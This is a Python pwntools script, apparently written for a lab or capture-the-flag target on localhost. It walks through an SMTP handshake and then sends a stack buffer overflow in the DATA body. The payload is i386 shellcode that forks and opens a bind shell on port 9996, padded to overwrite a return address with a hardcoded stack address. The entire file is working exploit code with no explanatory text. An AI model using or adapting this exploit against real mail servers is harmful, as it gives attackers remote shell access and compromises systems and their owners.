from pwn import *

shellcraft.i386.linux.push = shellcraft.i386.push
shellcraft.i386.linux.mov = shellcraft.i386.mov

con = connect('localhost', '9952')

con.sendline('HELO')
print(con.recvline())
con.sendline('MAIL FROM:<bill@localhost.com>')
print(con.recvline())
con.sendline('RCPT TO:<seba@localhost.com>')
print(con.recvline())
con.sendline('DATA')
print(con.recvline())

infloop = shellcraft.infloop()
fork = shellcraft.fork()
socket_open = "op:\n" + shellcraft.acceptloop_ipv4(9996) + shellcraft.dupsh()
test = 'cmp eax, 0\n'
jmp = 'je op\n'

fin = fork + test + jmp + infloop + socket_open
fin = asm(fin)

numberOfBytes = 0xffffc630 - 0xffffc220 + 3 * 4
con.write(fin + ('a' * (numberOfBytes - len(fin))) + p32(0xffffc220))
con.write('\r\n.\r\n')
print(con.recvline())

con.close()
